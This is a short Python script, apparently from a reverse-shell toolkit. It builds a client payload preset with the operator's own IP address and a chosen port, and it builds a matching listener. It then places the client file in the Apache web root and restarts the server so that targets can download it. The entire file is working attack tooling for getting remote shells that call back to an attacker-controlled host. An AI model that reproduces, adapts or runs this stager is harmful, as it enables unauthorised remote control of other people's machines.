from subprocess import Popen, PIPE, call
import os

i = Popen('hostname -I', shell = True, stdout = PIPE)
inp = i.stdout.read().split('\n')[0].split(' ')[0]

port_inp = int(input('\n\n            Enter The Port To Listen On: '))

os.system('cp main/clients/rev_gen_clientshell.py main/clients/reverse_clientshell.py')
os.system('cp main/host/reverse_gen_shell.py main/host/reverse_servershell.py')

f= open('main/clients/reverse_clientshell.py','a')
f1=open('main/host/reverse_servershell.py','a')
f.write("ip_addr= '"+str(inp)+"'"+'\nport='+str(port_inp)+'\n\n'+'connect()')
f1.write('\nport='+str(port_inp)+'\n\n'+'connect()')
f1.close()
f.close()

os.system('cp main/clients/reverse_clientshell.py /var/www/html; service apache2 restart; rm -rf main/clients/reverse_clientshell.py')
